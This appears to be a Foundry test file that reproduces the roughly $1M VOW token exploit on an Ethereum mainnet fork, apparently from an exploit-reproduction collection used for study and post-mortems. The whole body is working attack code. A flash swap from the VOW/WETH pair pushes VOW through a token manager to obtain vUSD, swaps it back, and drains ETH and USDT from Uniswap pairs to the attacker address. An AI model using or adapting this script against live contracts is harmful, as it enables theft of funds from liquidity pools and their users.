// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import "../interface.sol";
import "forge-std/Test.sol";

// @KeyInfo - Total Lost : ~ 1M USD
// Attacker : https://etherscan.io/address/0x48de6bf9e301946b0a32b053804c61dc5f00c0c3
// Attack Contract : https://etherscan.io/address/0xb7f221e373e3f44409f91c233477ec2859261758
// Vulnerable Contract : https://etherscan.io/address/0x1bbf25e71ec48b84d773809b4ba55b6f4be946fb
// Attack Tx : https://etherscan.io/tx/0x758efef41e60c0f218682e2fa027c54d8b67029d193dd7277d6a881a24b9a561

// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0x1bbf25e71ec48b84d773809b4ba55b6f4be946fb#code

// @Analysis
// Post-mortem :
// Twitter Guy :
// Hacking God :
pragma solidity ^0.8.0;

contract VOW is BaseTestWithBalanceLog {
    uint256 blocknumToForkFrom = 20_519_309 - 1;

    address private constant VOW_WETH_Pair = 0x7FdEB46b3a0916630f36E886D675602b1007Fcbb;
    address private constant vUSD_VOW_Pair = 0x97BE09f2523B39B835Da9EA3857CfA1D3C660cBb;
    address private constant VOW_USDT_Pair = 0x1E49768714E438E789047f48FD386686a5707db2;

    address private constant vscTokenManager = 0x184497031808F2b6A2126886C712CC41f146E5dC;
    address private constant vow = 0x1BBf25e71EC48B84d773809B4bA55B6F4bE946Fb;
    address private constant weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address private constant vUSD = 0x0fc6C0465C9739d4a42dAca22eB3b2CB0Eb9937A;
    address private constant usdt = 0xdAC17F958D2ee523a2206206994597C13D831ec7;

    address private constant attacker = 0x48de6bF9e301946b0a32b053804c61DC5f00c0c3;

    function setUp() public {
        vm.createSelectFork("mainnet", blocknumToForkFrom);

        vm.startPrank(attacker);
        IERC20(vow).approve(address(address(this)), type(uint256).max);
        IERC20(vUSD).approve(address(address(this)), type(uint256).max);
        vm.stopPrank();
    }

    function testExploit() public balanceLog {
        //implement exploit code here
        emit log_named_decimal_uint(
            "Before exploit VOW balance of attacker:", IERC20(vow).balanceOf(attacker), IERC20(vow).decimals()
        );
        emit log_named_decimal_uint(
            "Before exploit USDT balance of attacker:", IERC20(usdt).balanceOf(attacker), IERC20(usdt).decimals()
        );
        emit log_named_decimal_uint("Before exploit ETH balance of attacker:", attacker.balance, 18);

        uint256 vowBalance = IERC20(vow).balanceOf(VOW_WETH_Pair);
        Uni_Pair_V2(VOW_WETH_Pair).swap(vowBalance - 1, 0, address(this), hex"00");

        vowBalance = IERC20(vow).balanceOf(address(this));
        IERC20(vow).transfer(attacker, vowBalance / 10);
        (uint112 reserve0, uint112 reserve1,) = Uni_Pair_V2(VOW_WETH_Pair).getReserves();
        vowBalance = IERC20(vow).balanceOf(address(this));
        IERC20(vow).transfer(VOW_WETH_Pair, vowBalance / 2);

        uint256 amount0In = IERC20(vow).balanceOf(VOW_WETH_Pair) - reserve0;
        uint256 amount1Out = getAmount1Out(reserve0, reserve1, amount0In);
        Uni_Pair_V2(VOW_WETH_Pair).swap(0, amount1Out, address(this), hex"");
        IWETH(payable(weth)).withdraw(amount1Out);
        (bool success,) = attacker.call{value: amount1Out}("");
        require(success, "Fail to send eth");

        (reserve0, reserve1,) = Uni_Pair_V2(VOW_USDT_Pair).getReserves();
        IERC20(vow).transfer(VOW_USDT_Pair, IERC20(vow).balanceOf(address(this)));
        amount0In = IERC20(vow).balanceOf(VOW_USDT_Pair) - reserve0;
        amount1Out = getAmount1Out(reserve0, reserve1, amount0In);
        Uni_Pair_V2(VOW_USDT_Pair).swap(0, amount1Out, address(this), hex"");
        (success,) = usdt.call(
            abi.encodeWithSignature("transfer(address,uint256)", attacker, IERC20(usdt).balanceOf(address(this)))
        );
        require(success, "Fail to transfer USDT");

        emit log_named_decimal_uint(
            "After exploit: VOW balance of attacker:", IERC20(vow).balanceOf(attacker), IERC20(vow).decimals()
        );
        emit log_named_decimal_uint(
            "After exploit: USDT balance of attacker:", IERC20(usdt).balanceOf(attacker), IERC20(usdt).decimals()
        );
        emit log_named_decimal_uint("After exploit: ETH balance of attacker:", attacker.balance, 18);
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256, bytes calldata) external {
        require(msg.sender == VOW_WETH_Pair, "not from pool");
        require(sender == address(this), "not from this contract");

        IERC20(vow).transfer(attacker, amount0);

        IERC20(vow).transferFrom(attacker, vscTokenManager, amount0);

        uint256 vUSDBalance = IERC20(vUSD).balanceOf(attacker);
        IERC20(vUSD).transferFrom(attacker, address(this), vUSDBalance);
        (uint112 reserve0, uint112 reserve1,) = Uni_Pair_V2(vUSD_VOW_Pair).getReserves();
        IERC20(vUSD).transfer(vUSD_VOW_Pair, vUSDBalance);

        uint256 amount0In = IERC20(vUSD).balanceOf(vUSD_VOW_Pair) - reserve0;
        uint256 amount1Out = getAmount1Out(reserve0, reserve1, amount0In);
        Uni_Pair_V2(vUSD_VOW_Pair).swap(0, amount1Out, address(this), hex"");

        uint256 fee = amount0 * 3 / 997 + 1000;
        uint256 amountToPay = amount0 + fee;
        IERC20(vow).transfer(VOW_WETH_Pair, amountToPay);
    }

    function getAmount1Out(uint112 reserve0, uint112 reserve1, uint256 amount0In) private pure returns (uint256) {
        return reserve1 * 997 * amount0In / (1000 * reserve0 + 997 * amount0In);
    }

    receive() external payable {}
}
